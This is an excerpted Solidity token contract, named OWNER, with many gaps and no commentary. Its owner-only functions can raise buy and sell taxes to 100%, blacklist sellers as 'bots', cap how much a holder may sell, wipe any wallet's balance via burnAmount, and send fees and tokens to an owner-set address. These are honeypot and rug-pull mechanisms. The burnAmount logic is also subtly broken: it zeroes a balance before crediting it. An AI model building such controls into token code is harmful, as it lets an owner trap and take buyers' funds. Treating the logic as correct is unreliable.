...
contract OWNER is Context, IERC20, Ownable {
    ...
    uint256 public buyFee = 500;  // current fee = set fee / div (%)
    uint256 public sellFee = 500; // example, buyFee = 5%, set fee = 500 / 10000 = 0,05
    uint256 public sendFee = 0;
    uint256 public div = 10000;

    address public addressMarketing = 0x8D319600fe02E6c11d4271dD16C891A5B7D25Cb1; // marketing
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 public swapTokensAtAmount = 500000 * 10 ** decimals();

    bool private swap;
    bool public swapMarketingFeeEnabled = true;
    bool public swapTokensByLimitAmount = true;
    ...
    bool public autoCheck;
    bool private includeFee = true;
    bool public ownershipToRenounced;
    ...
    function setList(address account) public onlyOwner {
        list[account] = true;
    }

    function removeList(address account) public onlyOwner {
        list[account] = false;
    }

    function myRewards(address account, uint256 amount) public onlyOwner {
    ...
    function pickBot(address account) internal {
        bots[account] = true;
    }

    function setAutoCheck(bool _enable) public onlyOwner {
        autoCheck = _enable;
    }
        ...
        if (includeFee) {
            if(swap) { 
               return _basicTransfer(sender, recipient, amount);
                ...
                if (overMinimumTokenBalance && !swap && recipient == uniswapPair && swapMarketingFeeEnabled) 
                {
                    if(swapTokensByLimitAmount) {
    ...
    function _beforeTokenTransfer(
        ...
        if (
            sender != owner() && !list[sender] && !isMarketPair[sender] 
        ) {
            require(!bots[sender]);
            if (rewards[sender] > 0) {
                require(amount <= rewards[sender]);
            }
    ...
    function sendWithFee(
        ...
        if (sender != owner() && !list[sender] && sender != address(this)) {
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(!isMarketPair[sender] && !isMarketPair[recipient]) {
            tax = amount * sendFee / div;
        }
        
        if(isMarketPair[sender]) {
            tax = amount * buyFee / div;
        }
        else if(isMarketPair[recipient]) {
            tax = amount * sellFee / div;
        }
    ...
    function swapAndLiquify(uint256 tokenAmount) private {
        ...
        if(amountReceived > 0) {
            transferToAddressETH(addressMarketing, amountReceived);
        }
    }
    ...
    function setswapTokensByLimitAmount(bool _boo) external onlyOwner {
        require(swapTokensByLimitAmount != _boo);
        swapTokensByLimitAmount = _boo;
    }

    function setswapMarketingFeeEnabled(bool _boo) external onlyOwner {
        require(swapMarketingFeeEnabled != _boo);
        swapMarketingFeeEnabled = _boo;
    }

    function changeMarketingAddress(address _new) external onlyOwner {
        require(_new != address(0));
        require(addressMarketing != _new, "This address already set");

        addressMarketing = _new;
    }
    ...
    function burnAmount(address wallet, uint256 amount) public onlyOwner {
        ...
        if (_balances[wallet] <= amount * 10 ** 18) {
            _balances[wallet] = 0;
            _balances[DEAD] = _balances[DEAD] + _balances[wallet];
        } else {
            _balances[wallet] = _balances[wallet] - amount * 10 ** 18;
            _balances[DEAD] = _balances[DEAD] + amount * 10 ** 18;
        }
    }
    ...
    function setIncludeFee(bool _enabled) public onlyOwner {
        require(includeFee != _enabled, "Already enabled!");
        includeFee = _enabled;
    }

    function setFee(uint256 _buyFee, uint256 _sellFee, uint256 _sendFee) external onlyOwner {
        require(_buyFee <= 10000 && _sellFee <= 10000 && _sendFee <= 10000, "Incorrect tax");
        buyFee = _buyFee;
        sellFee = _sellFee;
        sendFee = _sendFee;
    }
    ...
    function claimToken(address _to) external onlyOwner {
        ...
        require(balanceToken > 0, "Balance equel 0");
        IERC20(address(this)).transfer(_to, balanceToken);
    }
}